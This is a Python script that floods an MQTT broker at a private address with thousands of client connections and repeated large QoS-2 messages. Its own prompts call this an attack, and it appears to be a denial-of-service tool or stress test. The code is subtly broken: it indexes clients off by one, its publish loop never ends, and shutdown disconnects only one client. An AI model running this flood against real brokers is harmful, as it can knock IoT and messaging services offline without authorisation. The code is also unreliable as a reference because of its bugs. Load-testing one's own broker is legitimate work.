import paho.mqtt.client as mqtt
import random
from time import sleep

broker_address = "192.168.200.1"
borker_port = 1883
number_of_clients = 2048
keep_alive = True
publish_messages = True
publish_large_message = True
publish_count = 100
subscribe_on_connect = False
count = 0
sample_size_to_send = 1.0
number_of_clients = int(input(f"Number of clients "))

# Define callback functions
def on_connect(client, userdata, flags, reason_code, properties):
    if reason_code.is_failure:
        print(f"Failed to connect: {reason_code}. loop_forever() will retry connection")
    else:
        # we should always subscribe from on_connect callback to be sure
        # our subscribed is persisted across reconnections.
        if subscribe_on_connect:
            client.subscribe("$SYS/#")

def on_message(client, userdata, msg):
	print(f"Received message: {msg.payload.decode()} on topic {msg.topic}")

def on_subscribe(client, userdata, mid, reason_code_list, properties):
    # Since we subscribed only for a single channel, reason_code_list contains
    # a single entry
    if reason_code_list[0].is_failure:
        print(f"Broker rejected you subscription: {reason_code_list[0]}")
    else:
        print(f"Broker granted the following QoS: {reason_code_list[0].value}")

try:
	clients = []
	print('Creating connections...\n')

	for i in range(number_of_clients):
		client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
		clients.append(client)
		clients[i-1].on_connect = on_connect
		# clients[i-1].on_message = on_message
		try:
			clients[i-1].on_subscribe = on_subscribe
			clients[i-1].connect(broker_address, borker_port, keep_alive)
			clients[i-1].loop_start()
		except:
			clients.remove(clients[i-1])
			number_of_clients -= 1
			
	if publish_messages:
		while count < publish_count:
			s = int(number_of_clients * sample_size_to_send)
			for i in random.sample(range(number_of_clients), s):
				if not publish_large_message:
					clients[i-1].publish("test/topic", "test message", qos=2)
				else:
					clients[i-1].publish("test/topic", "ABCDEF" * 1024, qos=2)
			sleep(5)

	end = input('Press any key to stop the attack\n')
	
	for i in range(number_of_clients):
		client.loop_stop()
		client.disconnect()

except KeyboardInterrupt:
	print('Stopping Attack')
	for i in range(number_of_clients):
		client.loop_stop()
		client.disconnect()